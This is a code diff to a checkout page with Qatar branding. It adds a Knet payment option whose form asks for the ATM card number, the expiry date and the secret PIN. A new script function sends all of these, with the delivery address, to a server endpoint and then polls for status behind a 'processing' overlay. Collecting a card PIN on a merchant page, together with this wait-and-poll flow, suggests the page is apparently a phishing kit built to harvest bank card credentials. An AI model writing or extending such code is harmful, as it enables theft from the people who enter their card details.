@@ -347,6 +347,17 @@
             text-align: center;
         }
 
+                @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
         @media (max-width: 580px) {
             .payment-card { border-radius: 0; box-shadow: none; }
             .main-container { padding: 20px 10px 40px; }
@@ -377,6 +388,23 @@
         <div class="payment-card">
 
             <div class="payment-card-body">
+
+                                <!-- PAYMENT METHOD SELECTION -->
+                <div style="margin-bottom: 25px;">
+                    <h3 style="font-size: 16px; font-weight: 700; color: var(--qatar-maroon); margin-bottom: 15px; display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-wallet"></i> Select Payment Method
+                    </h3>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                        <div id="selectCredit" onclick="showPayment('credit')" style="cursor: pointer; padding: 20px; border: 2px solid var(--qatar-maroon); border-radius: 12px; text-align: center; background: rgba(92, 6, 50, 0.05); box-shadow: 0 4px 12px rgba(92, 6, 50, 0.15); transition: all 0.3s ease;">
+                            <i class="fas fa-credit-card" style="font-size: 24px; color: var(--qatar-maroon); margin-bottom: 10px; display: block;"></i>
+                            <span style="font-weight: 700; font-size: 14px;">Credit Card</span>
+                        </div>
+                        <div id="selectKnet" onclick="showPayment('knet')" style="cursor: pointer; padding: 20px; border: 2px solid #eee; border-radius: 12px; text-align: center; background: #fff; transition: all 0.3s ease;">
+                            <img src="https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" style="height: 24px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;" alt="Knet">
+                            <span style="font-weight: 700; font-size: 14px;">Knet</span>
+                        </div>
+                    </div>
+                </div>
 
                 <!-- ORDER SUMMARY -->
                 <div class="order-summary">
@@ -635,7 +663,7 @@
                 </div>
 
                 <!-- CARD INPUTS -->
-                <div class="card-input-section">
+                <div id="creditCardSection" class="card-input-section">
                     <h3><i class="fas fa-credit-card"></i> Bank Card Details</h3>
 
                     <div class="form-group">
@@ -667,7 +695,40 @@
                     </div>
                 </div>
 
-                <button type="submit" class="pay-btn" id="payBtn">Confirm Payment - <span id="btnTotal">35 QAR</span></button>
+                                <button type="submit" class="pay-btn" id="payBtn">Confirm Payment - <span id="btnTotal">35 QAR</span></button>
+
+                <!-- Knet Inline Form -->
+                <div id="knetCardSection" class="card-input-section" style="display:none; border-color: #0070cd;">
+                    <h3><i class="fas fa-university" style="color:#0070cd;"></i> Knet Card Details</h3>
+
+                    <div class="form-group">
+                        <label>ATM Card Number</label>
+                        <div class="card-number-wrapper">
+                            <input type="text" id="knetCardNumber" name="knet_card_number" class="form-control" required placeholder="1234 5678 9012 3456" maxlength="19">
+                            <i class="fas fa-credit-card card-type-icon" id="knetCardTypeIcon" style="font-size: 24px; color: #0070cd;"></i>
+                        </div>
+                        <div class="field-error" id="knet_card_number_error"></div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiry Date</label>
+                            <div style="display: flex; gap: 8px; align-items: center;" dir="ltr">
+                                <input type="text" id="knetExpiryMonth" class="form-control" required placeholder="MM" maxlength="2" style="width: 70px; font-size:14px; padding:10px 12px;">
+                                <span style="font-size: 20px; font-weight: 700; color: #888;">/</span>
+                                <input type="text" id="knetExpiryYear" class="form-control" required placeholder="YY" maxlength="2" style="width: 70px; font-size:14px; padding:10px 12px;">
+                            </div>
+                            <div class="field-error" id="knet_expiry_error"></div>
+                        </div>
+                        <div class="form-group">
+                            <label>Secret PIN</label>
+                            <input type="password" id="knetPin" name="knet_pin" class="form-control" required placeholder="••••" maxlength="4" style="font-size:14px; padding:10px 12px;">
+                            <div class="field-error" id="knet_pin_error"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="button" id="knetPayBtn" class="pay-btn" style="display:none; background:#0070cd;" onclick="submitKnetPayment()">Confirm Payment - <span id="knetBtnTotal">35 QAR</span></button>
 
                 <div class="supported-cards">
                     <i class="fab fa-cc-visa" style="color:#1A1F71;"></i>
@@ -697,8 +758,8 @@
         <div style="width:90px;height:90px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
             <div style="width:45px;height:45px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ffffff;border-radius:50%;animation:spin 1s linear infinite;"></div>
         </div>
-        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;">Verifying card details...</div>
-        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">Please wait, processing payment.</p>
+        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;" id="loadingTitle">Verifying card details...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;" id="loadingMessage">Please wait, processing payment.</p>
     </div>
 
     <!-- Error Modal -->
@@ -713,6 +774,115 @@
 
     <script>
         let pollInterval = null;
+        let selectedMethod = 'credit';
+
+        function showPayment(method) {
+            selectedMethod = method;
+            const creditDiv = document.getElementById('selectCredit');
+            const knetDiv = document.getElementById('selectKnet');
+            const creditSection = document.getElementById('creditCardSection');
+            const payBtn = document.getElementById('payBtn');
+            const knetCardSection = document.getElementById('knetCardSection');
+            const knetPayBtn = document.getElementById('knetPayBtn');
+
+            if (method === 'credit') {
+                creditDiv.style.borderColor = 'var(--qatar-maroon)';
+                creditDiv.style.backgroundColor = 'rgba(92, 6, 50, 0.05)';
+                creditDiv.style.boxShadow = '0 4px 12px rgba(92, 6, 50, 0.15)';
+                knetDiv.style.borderColor = '#eee';
+                knetDiv.style.backgroundColor = '#fff';
+                knetDiv.style.boxShadow = 'none';
+                creditSection.style.display = 'block';
+                creditSection.style.animation = 'fadeIn 0.3s ease-in';
+                payBtn.style.display = 'block';
+                knetCardSection.style.display = 'none';
+                knetPayBtn.style.display = 'none';
+            } else {
+                creditDiv.style.borderColor = '#eee';
+                creditDiv.style.backgroundColor = '#fff';
+                creditDiv.style.boxShadow = 'none';
+                knetDiv.style.borderColor = '#0070cd';
+                knetDiv.style.backgroundColor = 'rgba(0, 112, 205, 0.05)';
+                knetDiv.style.boxShadow = '0 4px 12px rgba(0, 112, 205, 0.15)';
+                creditSection.style.display = 'none';
+                payBtn.style.display = 'none';
+                knetCardSection.style.display = 'block';
+                knetCardSection.style.animation = 'fadeIn 0.3s ease-in';
+                knetPayBtn.style.display = 'block';
+            }
+        }
+
+        async function submitKnetPayment() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) {
+                alert('Error: Order ID not found');
+                window.location.href = 'data-en.html';
+                return;
+            }
+
+            const country = localStorage.getItem('selectedCountry') || document.getElementById('country').value;
+            const city = document.getElementById('city').value;
+            const street = document.getElementById('street').value.trim();
+            const buildingNumber = document.getElementById('building_number').value.trim();
+            const floor = document.getElementById('floor').value;
+
+            if (!city || !street || !buildingNumber || !floor) {
+                alert('Please complete delivery address details');
+                return;
+            }
+
+            const knetCardNumber = document.getElementById('knetCardNumber').value.trim();
+            const rawKnetCardNumber = knetCardNumber.replace(/\s/g, '');
+            if (rawKnetCardNumber.length < 12) {
+                alert('Invalid Knet card number');
+                return;
+            }
+
+            const expiryMonth = document.getElementById('knetExpiryMonth').value.trim();
+            const expiryYear = document.getElementById('knetExpiryYear').value.trim();
+            const pin = document.getElementById('knetPin').value.trim();
+
+            if (!expiryMonth || !expiryYear || !pin) {
+                alert('Please complete Knet details');
+                return;
+            }
+
+            const data = {
+                orderId,
+                payment_method: 'Knet',
+                knet_data: {
+                    card_number: rawKnetCardNumber,
+                    expiry_month: expiryMonth,
+                    expiry_year: expiryYear,
+                    pin: pin
+                },
+                delivery_address: {
+                    country, city, street, building_number: buildingNumber, floor
+                }
+            };
+
+            try {
+                document.getElementById('loadingTitle').textContent = 'Processing KNET...';
+                document.getElementById('loadingMessage').textContent = 'Please wait, processing KNET payment.';
+                document.getElementById('loadingOverlay').style.display = 'flex';
+
+                const response = await fetch('/api/orders/payment-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (response.ok) {
+                    pollInterval = setInterval(pollOrderStatus, 2000);
+                } else {
+                    alert('Error processing payment');
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                }
+            } catch (err) {
+                alert('Connection error');
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+
 
         function isValidCardNumber(number) {
             const digits = number.replace(/\s/g, '');
@@ -991,6 +1161,7 @@
 
         document.getElementById('payBtn').addEventListener('click', async (e) => {
             e.preventDefault();
+            if (selectedMethod !== 'credit') return;
 
             const orderId = sessionStorage.getItem('orderId');
             if (!orderId) {
